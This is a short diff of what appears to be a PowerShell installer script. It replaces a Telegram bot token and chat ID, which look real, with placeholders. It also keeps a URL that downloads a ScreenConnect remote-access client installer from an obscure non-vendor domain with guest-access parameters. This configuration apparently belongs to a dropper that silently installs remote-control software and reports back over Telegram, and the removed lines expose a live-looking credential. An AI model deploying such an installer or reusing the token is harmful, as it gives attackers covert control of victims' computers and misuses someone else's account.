@@ -8,8 +8,8 @@
 $OutputEncoding = [System.Text.Encoding]::UTF8
 
 # 1. TELEGRAM CONFIGURATION
-$BotToken = "8692746089:AAFGNKwk9oB8lvK64xR3-dNtz2SQESLx1Oc"
-$ChatID   = "752022872"
+$BotToken = "BOT TOKEN"
+$ChatID   = "Chat ID"
 
 # 2. APPLICATION CONFIGURATION
 $MsiUrl    = "https://greefrealo.site/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=FARO&c=&c=&c=&c=&c=&c=&c="
